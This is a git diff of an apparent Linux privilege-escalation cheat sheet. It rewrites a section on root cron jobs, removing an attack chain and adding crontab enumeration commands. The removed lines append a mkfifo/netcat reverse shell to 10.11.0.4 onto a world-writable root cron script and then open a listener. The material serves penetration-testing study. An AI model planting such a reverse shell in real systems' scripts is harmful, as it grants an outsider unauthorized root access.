@@ -355,13 +355,31 @@ vim.basic /etc/passwd
 ```
 
  ###### Cronjob to elevate privilege
+ leverage the cron jobs run by root but current user can edit it to elevate privilege
  ```
- 1. grep "CRON" /var/log/cron.log
+ 1. Show Cronjobs logs:
+grep "CRON" /var/log/cron.log
 Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
-2. ls -lah /var/scripts/user_backups.sh
--rwxrwxrw- 1 root root 52 ian 27 17:02 /var/scripts/user_backups.sh
-3. echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
-4. nc -lnvp 1234
+
+2. To display contents of the root user’s crontab:
+less /etc/crontab
+
+3. View Cron Jobs by User:
+sudo crontab -u [username] -l
+
+4. List Hourly/daily/weekly/monthly Cron Jobs:
+ls -la /etc/cron.hourly
+
+5. To view software specefic cron tasks:
+cd /etc/cron/daily
+ls -l
+
+6. To list all scheduled cron jobs for the current user:
+crontab -l
+
+7. Cron jobs are typically located in the spool directories.
+They are stored in tables called crontabs.
+You can find them in /var/spool/cron/crontabs
  ```
 ###### Insecure file permission /etc/passwd
  ```
